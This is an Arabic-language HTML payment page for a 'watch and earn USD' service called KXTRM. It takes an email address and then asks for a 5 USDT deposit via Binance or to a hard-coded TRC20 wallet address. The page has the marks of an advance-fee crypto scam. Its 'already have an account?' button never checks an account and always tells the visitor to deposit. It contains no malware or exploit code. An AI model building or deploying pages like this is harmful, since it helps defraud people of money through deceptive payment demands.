<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KXTRM - الدفع والاشتراك</title>
    
    <!-- جلب خط Lalezar الاحترافي العريض من جوجل -->
    <link rel="preconnect" href="https://googleapis.com">
    <link rel="preconnect" href="https://gstatic.com" crossorigin>
    <link href="https://googleapis.com/css2?family=Lalezar&display=swap" rel="stylesheet">

    <style>
        body { 
            font-family: 'Lalezar', system-ui, sans-serif; 
            background-color: #0f0c1b; 
            color: #ffffff; 
            text-align: center; 
            padding: 40px 20px; 
            margin: 0; 
            letter-spacing: 0.5px;
        }
        .card { 
            background: linear-gradient(145deg, #1d1836, #130f24); 
            padding: 35px 25px; 
            border-radius: 20px; 
            display: inline-block; 
            width: 100%; 
            max-width: 380px; 
            box-shadow: 0 10px 25px rgba(0,0,0,0.5); 
            border: 1px solid #3d2f75; 
        }
        .brand { 
            font-size: 40px; 
            font-weight: normal; 
            margin-bottom: 10px; 
        }
        .subtitle { 
            color: #a29bfe; 
            font-size: 16px; 
            margin-bottom: 20px; 
        }
        .amount-tag {
            background-color: #1e1b4b;
            border: 1px dashed #6c5ce7;
            padding: 12px;
            border-radius: 10px;
            font-size: 20px;
            color: #00ffcc;
            margin-bottom: 25px;
        }
        .input-group { 
            margin-bottom: 20px; 
            text-align: right; 
        }
        label { 
            display: block; 
            margin-bottom: 8px; 
            color: #b2bec3; 
            font-size: 15px; 
        }
        input[type="text"] { 
            font-family: 'Lalezar', system-ui, sans-serif;
            width: 100%; 
            padding: 12px; 
            border-radius: 10px; 
            border: 1px solid #4a3f85; 
            background-color: #141026; 
            color: #fff; 
            box-sizing: border-box; 
            font-size: 16px; 
        }
        .footer-text { 
            margin-top: 25px; 
            font-size: 14px; 
            color: #636e72; 
        }
        .bottom-logo {
            max-width: 100%; 
            height: auto; 
            display: block; 
            margin: 20px auto 0 auto;
        }
        
        /* تنسيق زر بايننس المضمون */
        .binance-btn-final {
            font-family: 'Lalezar', system-ui, sans-serif;
            width: 100%; 
            padding: 14px; 
            background: #f3ba2f; 
            color: #000; 
            border: none; 
            border-radius: 8px; 
            font-size: 18px; 
            cursor: pointer; 
            display: block; 
            text-decoration: none; 
            margin-bottom: 12px;
            box-sizing: border-box;
            box-shadow: 0 4px 15px rgba(243, 186, 47, 0.3);
            transition: 0.2s;
        }

        /* تنسيق زر الحساب المسبق بالخط الجديد */
        .check-account-btn {
            font-family: 'Lalezar', system-ui, sans-serif;
            width: 100%;
            padding: 12px;
            background: transparent;
            color: #a29bfe;
            border: 1px dashed #4a3f85; 
            border-radius: 8px;
            font-size: 16px;
            margin-top: 15px; 
            margin-bottom: 5px; 
            cursor: pointer;
            transition: 0.3s;
        }
        .check-account-btn:hover {
            background: #1d1836;
            color: #fff;
            border-color: #6c5ce7;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="brand">KXTRM</div>
        <div class="subtitle">إنشاء حساب جديد للمتابعة وتشغيل الخدمة</div>
        
        <div class="amount-tag">الإيداع: 5.00 USDT</div>

        <form id="paymentForm">
            <!-- الخطوة الأولى: بداية الدخول -->
            <div id="step1">
                <div class="input-group">
                    <label for="username">البريد الإلكتروني</label>
                    <input type="text" id="username" required placeholder="example@gmail.com" style="width: 100%; padding: 12px; background: #fff; color: #000; border: none; border-radius: 8px; margin-top: 8px; box-sizing: border-box;">
                </div>
                <button type="button" onclick="goToStep2()" style="font-family: 'Lalezar', system-ui, sans-serif; width: 100%; padding: 14px; background: linear-gradient(to right, #7b2cbf, #9d4edd); color: #fff; border: none; border-radius: 8px; font-size: 18px; margin-top: 20px; cursor: pointer;">متابعة إلى الإيداع</button>
                
                <!-- الزر بالخط العريض الجديد -->
                <button type="button" onclick="alertNoAccount()" class="check-account-btn">هل لديك حساب مسبقاً؟</button>
                
                <img src="logo.png" alt="logo" class="bottom-logo">
            </div>

            <!-- الخطوة الثانية: خيارات الإيداع -->
            <div id="step2" style="display: none; margin-top: 15px;">
                
                <a href="https://binance.com" class="binance-btn-final">
                    ⚡ الدفع عبر بايننس طلب دفع
                </a>

                <div style="margin-top: 25px; padding: 15px; border: 1px dashed #ffffff33; border-radius: 8px; background: #0f0c1b; text-align: center;">
                    <p style="font-size: 15px; margin-bottom: 10px; color: #bbb;">أو للإيداع من OKX وباقي المحافظ (شبكة TRC20):</p>
                    <input type="text" value="THJN4XBKxbZNYsw7YAhmNiZSupn3KVEDFP" id="cryptoAddress" readonly style="font-family: 'Lalezar', system-ui, sans-serif; width: 85%; padding: 8px; text-align: center; background: #1a1530; color: #fff; border: 1px solid #444; border-radius: 4px; font-size: 14px; direction: ltr;">
                    <button onclick="copyWalletAddress()" type="button" style="font-family: 'Lalezar', system-ui, sans-serif; padding: 8px 12px; background: #333; color: #fff; border: 1px solid #555; border-radius: 4px; cursor: pointer; font-size: 14px; margin-top: 8px; width: 60%;">نسخ عنوان المحفظة</button>
                </div>
            </div>
        </form>

        <div class="footer-text">WATCH AND EARN USD</div>
    </div>

<script>
    function goToStep2() {
        const usernameInput = document.getElementById('username').value;
        if(usernameInput.trim() === "") {
            alert("يرجى كتابة البريد الإلكتروني أولاً.");
            return;
        }
        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2').style.display = 'block';
    }

    function copyWalletAddress() {
        const copyText = document.getElementById("cryptoAddress");
        copyText.select();
        copyText.setSelectionRange(0, 99999);
        navigator.clipboard.writeText(copyText.value);
        alert("تم نسخ عنوان المحفظة! قم بالتحويل من OKX أو أي محفظة أخرى على شبكة TRC20 بقيمة 5 USDT.");
    }

    function alertNoAccount() {
        alert("أنت لا تمتلك حساباً مسبقاً، يرجى كتابة بريدك الإلكتروني وإتمام الإيداع لتفعيل الخدمة.");
    }
</script>
</body>
</html>
